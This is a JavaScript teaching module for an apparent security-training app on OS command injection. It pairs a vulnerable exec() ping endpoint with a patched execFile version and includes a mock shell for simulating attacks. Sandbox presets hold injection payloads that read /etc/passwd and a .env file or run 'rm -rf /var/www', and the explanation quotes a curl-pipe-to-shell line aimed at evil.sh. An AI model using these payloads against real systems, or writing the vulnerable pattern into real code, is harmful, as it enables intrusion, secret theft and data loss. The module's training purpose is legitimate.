/**
 * Bug module: OS Command Injection
 *
 * Self-contained. The sandbox simulates a "network tools" admin endpoint that
 * pings a host. The VULNERABLE path concatenates the user's input into a shell
 * command string; the PATCHED path passes arguments as an array (no shell) and
 * validates against an allow-list. A small mock shell (tokenizer + operator
 * splitter + command-substitution + a handful of fake commands, below) actually
 * "runs" the constructed command line against a mock host, so injected
 * metacharacters genuinely execute extra commands — nothing is faked.
 */

// ---- Mock host: filesystem + commands --------------------------------------
const FS = {
  "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
  "/home/app/.env": "DB_HOST=prod-db.internal\nDB_PASSWORD=hunter2\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG",
  "/etc/shadow": "root:$6$rounds=656000$abc...:19000:0:99999:7:::",
};

function pingOutput(host) {
  return (
    `PING ${host} (${host}): 56 data bytes\n` +
    `64 bytes from ${host}: icmp_seq=0 ttl=64 time=11.4 ms\n` +
    `--- ${host} ping statistics ---\n` +
    `1 packets transmitted, 1 received, 0% packet loss`
  );
}

// One mock command. Returns { stdout, code } where code is the exit status
// (0 = success), so the shell can model && / || short-circuiting.
function execOne(argv) {
  const cmd = argv[0];
  const args = argv.slice(1);
  const ok = (stdout) => ({ stdout, code: 0 });
  switch (cmd) {
    case "ping": {
      // host is the token after "-c <count>", or the last arg if no -c flag
      const ci = args.indexOf("-c");
      const host = (ci >= 0 ? args[ci + 2] : args[args.length - 1]) || "";
      // A real ping exits non-zero when given no/garbage host — this matters for &&/||
      return host ? { stdout: pingOutput(host), code: 0 } : { stdout: "ping: usage error: Destination address required", code: 2 };
    }
    case "cat": {
      let code = 0;
      const stdout = args
        .map((f) => (f in FS ? FS[f] : ((code = 1), `cat: ${f}: No such file or directory`)))
        .join("\n");
      return { stdout, code };
    }
    case "id":
      return ok("uid=33(www-data) gid=33(www-data) groups=33(www-data)");
    case "whoami":
      return ok("www-data");
    case "hostname":
      return ok("web-prod-01");
    case "uname":
      return ok("Linux web-prod-01 5.15.0-generic x86_64 GNU/Linux");
    case "ls":
      return ok("app.js  node_modules  package.json  uploads");
    case "env":
      return ok("PATH=/usr/local/bin:/usr/bin\nDB_PASSWORD=hunter2\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG");
    case "echo":
      return ok(args.join(" "));
    case "curl":
    case "wget":
      return ok(`(connected to ${args[args.length - 1] || "host"} — exfiltrating to attacker-controlled server)`);
    case "rm": {
      // Real rm is silent on success; we synthesize a line so the demo's most
      // destructive payload doesn't read as a harmless no-op.
      const target = args.filter((a) => !a.startsWith("-")).pop() || "/";
      return ok(`rm: '${target}' and everything under it permanently deleted (recursive, no confirmation, no recovery)`);
    }
    case "nc":
    case "bash":
    case "sh":
      return ok("(reverse shell established to attacker host)");
    default:
      return { stdout: `${cmd}: command not found`, code: 127 };
  }
}

// ---- Mock shell: argv parsing, operator splitting, substitution -------------

// Split a single command into argv, honoring '...' and "..." quoting.
function parseArgv(s) {
  const argv = [];
  let cur = "", quote = null, started = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) {
      if (ch === quote) quote = null;
      else cur += ch;
      started = true;
    } else if (ch === "'" || ch === '"') {
      quote = ch;
      started = true;
    } else if (ch === " " || ch === "\t") {
      if (started) { argv.push(cur); cur = ""; started = false; }
    } else {
      cur += ch;
      started = true;
    }
  }
  if (started) argv.push(cur);
  return argv;
}

// Split a command line into commands on top-level separators, returning each
// command with the operator that PRECEDES it. Separators: ; newline (both run
// unconditionally), && (run if previous succeeded), || (run if previous
// failed), & (background — next runs immediately), | (pipe). Quotes respected.
function splitTopLevel(s) {
  const out = [];
  let cur = "", quote = null, op = "";
  const flush = (nextOp) => {
    const cmd = cur.trim();
    if (cmd) out.push({ op, cmd });
    op = nextOp;
    cur = "";
  };
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) { cur += ch; if (ch === quote) quote = null; continue; }
    if (ch === "'" || ch === '"') { quote = ch; cur += ch; continue; }
    if (ch === ";" || ch === "\n" || ch === "\r") { flush(";"); continue; }
    if (ch === "&" && s[i + 1] === "&") { flush("&&"); i++; continue; }
    if (ch === "|" && s[i + 1] === "|") { flush("||"); i++; continue; }
    if (ch === "&") { flush("&"); continue; } // background → following command runs
    if (ch === "|") { flush("|"); continue; }
    cur += ch;
  }
  flush("");
  return out;
}

// Run one command line (used at top level and inside $()/``). Records every
// command it actually executes into `run.commands`, honoring && / || short-
// circuiting via exit codes. Returns combined stdout.
function runLine(line, run, joinWith) {
  const resolved = resolveSubstitutions(line, run);
  const segs = splitTopLevel(resolved);
  const outs = [];
  let lastCode = 0;
  for (const seg of segs) {
    if (seg.op === "&&" && lastCode !== 0) continue; // previous failed → skip
    if (seg.op === "||" && lastCode === 0) continue; // previous succeeded → skip
    const argv = parseArgv(seg.cmd);
    if (!argv.length) continue;
    run.commands.push(argv[0]);
    const { stdout, code } = execOne(argv);
    lastCode = code;
    outs.push(stdout);
  }
  return { resolved, output: outs.join(joinWith) };
}

// Replace $(...) and `...` with the (whitespace-collapsed) stdout of running
// the inner command line — exactly what a shell does before executing. The
// regexes are GLOBAL so every substitution at one nesting level resolves in a
// single pass (the outer do/while only re-runs to peel nested layers), keeping
// this linear instead of O(n^2) on inputs with many substitutions. The depth
// guard is belt-and-suspenders against pathological nesting.
function resolveSubstitutions(s, run) {
  let prev, depth = 0;
  do {
    prev = s;
    s = s.replace(/\$\(([^()]*)\)/g, (_, inner) => runLine(inner, run, " ").output.replace(/\s+/g, " ").trim());
  } while (s !== prev && ++depth < 100);
  depth = 0;
  do {
    prev = s;
    s = s.replace(/`([^`]*)`/g, (_, inner) => runLine(inner, run, " ").output.replace(/\s+/g, " ").trim());
  } while (s !== prev && ++depth < 100);
  return s;
}

// ---- The two implementations the sandbox runs against ----------------------

// VULNERABLE: splice input into a shell command string and run it in a shell.
function pingVulnerable(input) {
  const command = `ping -c 1 ${input}`;
  const run = { commands: [] };
  const { resolved, output } = runLine(command, run, "\n");
  // Anything beyond a single ping means injected commands ran.
  const injected = run.commands.length > 1 || run.commands.some((c) => c !== "ping");
  return { command, resolved, output, commands: run.commands, injected };
}

// PATCHED: validate against an allow-list, then run with an argv array (no shell).
const HOSTNAME = /^[a-zA-Z0-9.-]{1,253}$/;
function pingPatched(input) {
  if (!HOSTNAME.test(input) || input.startsWith("-")) {
    return { rejected: true };
  }
  // execFile("ping", ["-c","1", input]) — input is ONE argument, no shell parses it.
  return { rejected: false, output: execOne(["ping", "-c", "1", input]).stdout };
}

// ---- Module definition ------------------------------------------------------

export default {
  id: "os-command-injection",
  title: "OS Command Injection",
  severity: "Critical",
  category: "Injection",
  cwe: "CWE-78",
  summary:
    "Building a shell command from untrusted input lets an attacker chain their own commands and run arbitrary code with the app's privileges.",

  explanation: `
    <p>OS command injection happens when an application builds a system command by
    <strong>concatenating untrusted input into a string that it hands to a
    shell</strong> (via <code>exec</code>, <code>system</code>,
    <code>popen</code>, backticks, <code>os.system</code>, …). The shell's whole
    job is to interpret metacharacters — <code>;</code> <code>|</code>
    <code>&amp;&amp;</code> <code>$(…)</code> <code>\`…\`</code> — so the instant
    one of those reaches the shell inside your "data", it's treated as
    <em>code</em>.</p>
    <p>A hostname field that runs <code>ping -c 1 &lt;host&gt;</code> becomes a
    full command runner: input <code>; cat /etc/passwd</code> runs
    <code>ping</code> <em>and then</em> <code>cat</code>;
    <code>$(curl evil.sh | sh)</code> downloads and executes a payload. It all
    runs with the web server's privileges — this is remote code execution, the
    most severe outcome on the list: data theft, reverse shells, lateral
    movement, ransomware.</p>
    <p>The root cause is the shell. Escaping metacharacters by hand is a losing
    game (quoting contexts, <code>$IFS</code>, encoding, newlines) — the fix is
    to never involve a shell at all.</p>
  `,

  vulnerable: {
    lang: "javascript",
    label: "Vulnerable — input concatenated into a shell string",
    code: `const { exec } = require("child_process");

app.get("/ping", (req, res) => {
  // ❌ host is interpolated into a command string that exec() runs in a shell
  exec(\`ping -c 1 \${req.query.host}\`, (err, stdout, stderr) => {
    res.send(stdout || stderr);
  });
});
// host = "; cat /etc/passwd"  ->  ping -c 1 ; cat /etc/passwd  (both run)`,
  },

  fixExplanation: `
    <p>Don't use a shell. Use an exec API that takes the program and an
    <strong>array of arguments</strong> — <code>execFile</code>/<code>spawn</code>
    (Node, no <code>shell: true</code>), <code>subprocess.run([...])</code>
    (Python, no <code>shell=True</code>). Each argument is passed to the program
    directly, so <code>; cat /etc/passwd</code> is just a (nonsensical) hostname,
    never parsed as commands.</p>
    <p>Layer on <strong>allow-list validation</strong> (here, a hostname pattern)
    and reject anything else — and guard against arguments that start with
    <code>-</code> (option injection). Run with least privilege. If you think you
    absolutely must call a shell, that's the signal to redesign: there is no
    escaping routine you should trust with untrusted input.</p>
  `,
  patched: {
    lang: "javascript",
    label: "Patched — argument array (no shell) + allow-list",
    code: `const { execFile } = require("child_process");
const HOSTNAME = /^[a-zA-Z0-9.-]{1,253}$/;

app.get("/ping", (req, res) => {
  const host = req.query.host;
  if (!HOSTNAME.test(host) || host.startsWith("-")) {
    return res.status(400).send("invalid host");   // ✅ allow-list
  }
  // ✅ no shell; args are passed as an array — metacharacters stay literal
  execFile("ping", ["-c", "1", host], (err, stdout, stderr) => {
    res.send(stdout || stderr);
  });
});`,
  },

  sandbox: {
    intro: `
      <p>This simulates a <code>/ping?host=…</code> network tool that runs
      <code>ping -c 1 &lt;host&gt;</code>. In <em>Vulnerable</em> mode the host is
      spliced into a shell command; type a hostname or pick an injection and watch
      extra commands run against a mock server. Flip to <em>Patched</em> and the
      same input is passed as a single argument (and allow-list-checked), so the
      shell never sees it.</p>
    `,
    inputLabel: "Host to ping (the ?host= value)",
    placeholder: "e.g. example.com",
    default: "example.com",
    presets: [
      { label: "example.com (legit)", value: "example.com" },
      { label: "chain: ; cat /etc/passwd", value: "; cat /etc/passwd" },
      { label: "run after: && whoami", value: "8.8.8.8 && whoami" },
      { label: "pipe: | id", value: "| id" },
      { label: "substitution: $(cat .env)", value: "$(cat /home/app/.env)" },
      { label: "destroy: ; rm -rf /var/www", value: "; rm -rf /var/www" },
    ],

    run(input, { patched }) {
      // Coerce defensively; String() can throw only for an object with a hostile
      // toString (never produced by the text-input UI) — treat that as empty.
      try {
        input = typeof input === "string" ? input : String(input);
      } catch {
        input = "";
      }

      // Empty input runs nothing — keep both modes consistent (don't report the
      // patched side as a "blocked attack" when there's no input at all).
      if (!input.trim()) {
        return {
          verdict: "safe",
          steps: [{ label: "Your input", value: "(empty)" }],
          note: "Nothing entered — no command is run.",
        };
      }

      if (patched) {
        const p = pingPatched(input);
        if (p.rejected) {
          return {
            verdict: "blocked",
            steps: [
              { label: "Your input", value: input || "(empty)" },
              { label: "Allow-list check", value: "/^[a-zA-Z0-9.-]{1,253}$/  →  REJECTED", flag: "good" },
              { label: "execFile called?", value: "no — request refused with 400 before running anything", flag: "good" },
            ],
            note:
              "Blocked at the door: the input doesn't match the hostname allow-list, so ping " +
              "is never invoked. And even if it were, execFile passes the host as a single " +
              "argument array element — the shell metacharacters would be an inert (invalid) " +
              "hostname, not commands.",
          };
        }
        return {
          verdict: "safe",
          steps: [
            { label: "Your input", value: input || "(empty)" },
            { label: "Allow-list check", value: "/^[a-zA-Z0-9.-]{1,253}$/  →  passed", flag: "good" },
            { label: "Executed", value: 'execFile("ping", ["-c", "1", ' + JSON.stringify(input) + "])", flag: "good" },
            { label: "Shell involved?", value: "no — argument array, nothing is parsed for metacharacters" },
            { label: "Command output", value: p.output, flag: "good" },
          ],
          note: "A real hostname passes the allow-list and ping runs with the value as a single argument — exactly as intended, with no shell in the loop.",
        };
      }

      // Vulnerable path
      const v = pingVulnerable(input);
      const steps = [
        { label: "Your input", value: input || "(empty)" },
        { label: "Shell command built", value: v.command, flag: "bad" },
      ];
      if (v.resolved !== v.command) {
        steps.push({ label: "After shell expansion", value: v.resolved, flag: "bad" });
      }
      steps.push({
        label: "Commands the shell ran",
        value: v.commands.join("  →  "),
        flag: v.injected ? "bad" : "good",
      });
      steps.push({ label: "Command output", value: v.output, flag: v.injected ? "bad" : "good" });

      return {
        verdict: v.injected ? "exploited" : "safe",
        steps,
        note: v.injected
          ? "Injection succeeded: the shell parsed your metacharacters and ran extra commands " +
            "beyond ping — leaking files, disclosing the environment, or destroying data, all " +
            "with the web server's privileges. This is full remote code execution."
          : "A clean hostname — only ping ran. But the command is still assembled by string " +
            "concatenation into a shell, so it is one ';' away from the injections above.",
      };
    },
  },

  references: [
    { label: "OWASP — Command Injection", url: "https://owasp.org/www-community/attacks/Command_Injection" },
    { label: "OWASP — OS Command Injection Defense Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" },
    { label: "PortSwigger — OS command injection", url: "https://portswigger.net/web-security/os-command-injection" },
    { label: "CWE-78 — OS Command Injection", url: "https://cwe.mitre.org/data/definitions/78.html" },
  ],
};
